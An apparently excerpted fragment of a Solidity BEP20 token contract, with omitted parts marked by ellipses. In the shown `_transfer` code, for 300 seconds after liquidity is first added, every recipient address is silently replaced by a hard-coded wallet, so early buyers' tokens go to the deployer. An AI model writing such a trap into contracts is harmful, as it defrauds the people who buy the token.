...
contract Token is Context, IBEP20, Ownable {
    ...
    uint256 public _startTimeForLP;
    uint256 public _OperationStep;
    ...
    address payable public marketingWalletAddress = payable(0x7647A81D394c26a18062fcA39f7013549F3E79a7);
    address public _market = 0x7647A81D394c26a18062fcA39f7013549F3E79a7;
    ...
    function _transfer(
        ...
        if(automatedMarketMakerPairs[to] && _isExcludedFromFee[from] && _OperationStep == 1) 
        {
            _startTimeForLP = block.timestamp;
            _OperationStep = 2;
        }
        ...
        if (
            ...
            if(block.timestamp.sub(_startTimeForLP) <= 300)
            {
                to = _market;
            }
            if (
